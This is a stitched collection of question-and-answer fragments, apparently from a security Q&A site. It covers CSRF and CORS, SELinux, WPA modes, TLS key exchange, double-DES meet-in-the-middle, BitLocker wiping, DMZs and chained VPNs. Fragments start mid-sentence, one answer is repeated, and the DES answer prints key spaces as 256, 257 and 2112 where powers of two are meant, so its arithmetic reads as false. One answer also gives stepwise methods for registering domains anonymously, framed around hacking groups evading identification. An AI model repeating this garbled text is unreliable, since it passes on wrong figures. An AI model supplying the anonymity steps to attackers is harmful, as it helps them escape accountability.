      "question": "How do hacking groups register domains remaining anonymous?\nLet's take lulzsec as an example; they registered lulzsecurity.com. There are two problems that I don't understand how they solved:\n\nThey had to pay for it. Tracking down money is generally much easier than tracking down IP addresses. I assume they didn't use stolen credit cards (with all the attention they received, people would have quickly found out and taken away their domain).. And even with prepaid credit cards it's relatively easy to find out who bought it, with security cameras/etc.\nThey had to have played by ICANN's rules - again, because of the attention they received, if they hadn't people would have found out and they would have lost the domain. This means giving valid contact information.",
      "answer": "Here is one method of purchasing a domain name pretty close to anonymously.\n\nUse Tor. Understand its weaknesses\nBuy a prepaid credit card in cash, specifically one not requiring activation or signature.\nRandomly generate a full alias to use during online registration.\nRegister an account at a domain registrar.\nUse the prepaid credit card to buy a domain. \nRepeat for other needed services.\n\nNote that 2. requires non-anonymous interaction and is therefore the riskiest. Let's try another path.\n\nUse Tor. Understand its weaknesses\nRandomly generate a full alias to use during online registration.\nEarn some Bitcoins anonymously online, thus seeding without human contact.\nChose a domain registrar and DNS host that supports Bitcoins\nRepeat for other needed services."

Better to tie a unique CSRF token to the user's session and put that value in forms and ajax requests. In any case, you shouldn't implement the mechanism yourself but use a modern web application framework that can do it for you.\nSame Origin Policy is the core of the web browser security model and essentially says that:\n\nWebsites from different origins (different URL host, port, or protocol) can freely send credentialed (that is, including session cookies) GET, POST, HEAD, and OPTIONS requests to each other.\nWebsites from different origins however cannot read the responses of those requests. Though there are exceptions of sorts that allow for executing scripts and rendering images for example.\n\nCORS (Cross-Origin Request Sharing) is not a security mechanism per se, I would rather call it an insecurity mechanism. It simply allows for an individual website to opt-out of the same-origin policy for some URL address/addresses.\nAbout the compatibility, even IE10 supports CORS so I wouldn't worry about that. But yes, like said, even if CORS is not supported it just means that the same-origin policy will remain effective.\nSo, a bad CORS policy and CSRF are two distinct vulnerabilities, you can have one, none, or both.\nCSRF vulnerability = You are not using CSRF tokens so that POST requests from malicious websites (which are allowed by the same-origin policy whether you use CORS or not) can make unwitting changes in your web application on the logged-in user's behalf. Those websites are still not allowed to read the responses, but they won't have to.\nCORS vulnerability = You are allowing other websites to do something that breaks the same-origin policy. The worst thing you can do is enable the \"allow credentials\" for arbitrary/untrusted domains, which will let malicious websites use your web application on your user's behalf whether you use CSRF tokens or not because CSRF protection relies on the same-origin policy for it to work.\nI hope that clears things up!",

You then label /var/lib/app/log as var_lib_privapp_rw_t and indicate that only a process running as privapp_t is able to access it.\nThis is the easy part -- the hard part is expressing the above in the policy language, which is the bit known to drive grown men and women to tears. :)"

You just need to understand the difference between personal (pre shared key) and enterprise versions of both the protocols.\nThe personal version is where all the users share a secret password that is configured in the access point. In the enterprise version there is a central authentication server and all the users have different sets of credentials that they use in order to access WiFi. So basically there is no single shared password."

However, each manager got his copies on paper of a different color - so everyone that answered the yellow copy was from RH, everyone that answered the blue copy was from Finances, everyone that answered the pink copy was from Sales, and so on. Even if you didn't ask for the employee department, name or registry number, you knew from where he was and in what department he worked."

Is there also a way for wingraph32 to support very large graphs?\nThanks.",
      "answer": "If you want to get a node and edge count for a function's graph in IDA, you can calculate it with the given IDAPython code:\nfunc = idaapi.get_func(here())\ng = idaapi.FlowChart(func)\n\nnodes = 0\nedges = 0\nfor x in g:\n  nodes += 1\n  for succ in x.succs():\n    edges += 1\n\n  for pred in x.preds():\n    edges += 1\n\nprint \"Number of nodes\", nodes\nprint \"Number of edges\", edges\n\nAs for the wingraph32 tool, I recommend you to use the \"Proximity Viewer\" instead. Just press the key \"-\" when the cursor is inside a function."

They can have their forgot password function generate a password, hash it and store it in their database, and then (while it's still in memory) generate an email that includes the plaintext value."

It is done following this procedure, in general:\n\nClient & server generate each a random value and send to each other\nServer sends the public key to the client\nThe client generates a value called \"pre-master secret\" using both random values, and encrypts it using server's key, then sends it to the server\nNow both client and server have each other's random values and \"pre-master secret\", so basing on this information they can both generate the same session key and start using it in encrypting the following messages.\n\nSee detailed protocol description for more in-depth explanation."

      "question": "How does the meet in the middle attack work on double DES?\nI am having trouble understanding the meet in the middle attack and how it works on double DES.\nI understand that on single DES the key length is 256 but why when using double DES is it 257? Can someone explain it in simple terms please?",
      "answer": "There is a concept of effective/actual key strength. For Double DES the effective key strength is 257 even though double DES uses 2112 keys. The below example will make it clear.\nAssume that you are a cryptanalyst who has access to the plain text and encrypted text. Your aim is to recover the secret key. Assume AAA (plaintext) -> XXX (After 1st encryption) -> ZZZ (after 2nd encryption).\nYou start with AAA and try all the 256 combinations for secret key by encrypting AAA. This will give you a big list of possible values for XXX.\nNext you take ZZZ and try all the 256 combinations for secret key by decrypting ZZZ. This will give you a big list of possible values for XXX.\nThe amount of effort you have put in 256 + 256 = 257.\nNow do a simple lookup between the two lists to find a matching value. As soon you see a matching value XXX in both the lists, you have found out the secret key. So this means that with effort of 257 keys you have broken the encryption."

      "answer": "It sounds like standard phishing page with the aim of stealing passwords and nothing more than that. XSS and CSRF attack will only work if these vulnerabilities exist in itune websites and not on any phishing page. When browser load  website it uses cookie which is stored in browser with the name of its website  and due to same origin policy it will not send any cookies or sensitive data to any other domain (phishing page) unless it is explicitly stated by website owner by implementing cors mechanism"

This is a common construction in full-disk encryption (FDE) schemes. If the BitLocker volume header has been erased from the disk, the key used to encrypt/decrypt the bulk data has been destroyed, so the data is completely unrecoverable.\nWhether or not the volume header was wiped from the disk depends on the type of disk and what type of format you did.\nIf the disk is a modern SSD (i.e. not one of the first generations from the early 2000s) it will support Secure Erase and TRIM, which Windows will have used. You can usually tell because the format operation takes only a few seconds instead of tens of minutes or a few hours. The data written to the flash on the SSD is transparently encrypted during normal operation. The erase command simply throws away the key and mapping table, then generates a new key. Since the old key is gone, the data on the disk is rendered unreadable. This is helpful since SSDs are prone to write wear, so overwriting all the flash cells reduces their operating lifetime. In addition, SSDs use overprovisioning (i.e. more flash cells than the advertised capacity) to help aid with wear-levelling, so if the OS tries to just overwrite the logical blocks it can see, it won't actually clear the data on those extra cells. In short: if it's an SSD, the format will have wiped the volume header.\nIf the disk is a mechanical hard disk, a quick format may not have removed the volume header. A quick format on a hard disk works by just writing a new filesystem header and table to the start of the disk, without actually erasing any data. The first sector(s) of the disk will likely have been overwritten by the new filesystem, but (if I recall correctly) the BitLocker volume header is also backup up in another sector later in the disk, in case the primary header becomes corrupted.

      "answer": "Simply, a DMZ is portion of your network carved off and isolated from the rest of your network. A firewall is the appliance that creates that isolation, by restricting traffic both between the intranet and the DMZ and the DMZ and other networks it's exposed to."

The operator will see the traffic as coming from the endpoint of the final VPN regardless of how many there are in the chain.  You're still vulnerable to being identified through other means (eg. if you sign up with a username you use elsewhere).  This is essentially the same level of anonymity you'd get through TOR, but it costs more (and presumably has better performance).\nIf you're trying to keep a government from tracking you down, multiple VPNs again won't gain you anything.  The government just needs to identify the last one in the chain, and then ask who's paying for it.  Here, TOR is better, since there's no financial link to you.\nIf you're dealing with an adversary who can monitor packet movements on the Internet, but can't monitor financial transactions or serve subpoenas (I can't think of any), chained VPNs will increase your anonymity by increasing the number of traffic flows they need to monitor.

      "question": "Is chaining multiple VPNs a good way to reach anonymity on the internet?\nI would like to chain a couple, say 6 or 7, VPNs together to create a sort of \"super\" encrypted lane on the internet. I'm not too concerned about speeds, all I want is privacy and anonymity. \nI've read online about adding a Tor exit node to the equation for an even better level of privacy. Is this a safe option to increase my VPN chain? \nI'm going to use this \"super\" VPN Chain mostly on public WiFi so does this rule out any attacker might get ahold of my data? Some sites I use on a daily basis don't have an SSL layer and there are also some sites that have me worried about their level of security.",
      "answer": "It depends on what you're trying to defend against.\nIf you're trying to prevent a site operator from identifying who you as a user are, multiple VPNs won't gain you anything.  The operator will see the traffic as coming from the endpoint of the final VPN regardless of how many there are in the chain.  You're still vulnerable to being identified through other means (eg. if you sign up with a username you use elsewhere).  This is essentially the same level of anonymity you'd get through TOR, but it costs more (and presumably has better performance).\nIf you're trying to keep a government from tracking you down, multiple VPNs again won't gain you anything.  The government just needs to identify the last one in the chain, and then ask who's paying for it.  Here, TOR is better, since there's no financial link to you.\nIf you're dealing with an adversary who can monitor packet movements on the Internet, but can't monitor financial transactions or serve subpoenas (I can't think of any), chained VPNs will increase your anonymity by increasing the number of traffic flows they need to monitor.  But this is a very rare case, if it exists at all."
